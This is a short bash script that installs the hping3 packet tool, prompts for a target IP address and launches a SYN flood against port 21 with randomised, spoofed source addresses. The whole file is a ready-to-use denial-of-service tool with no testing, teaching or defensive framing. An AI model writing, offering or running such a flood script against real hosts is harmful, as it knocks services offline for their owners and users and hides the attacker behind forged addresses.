#!/bin/bash
sudo apt-get install hping3 | echo off
echo -n "enter target ip > "
read ip
sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $ip
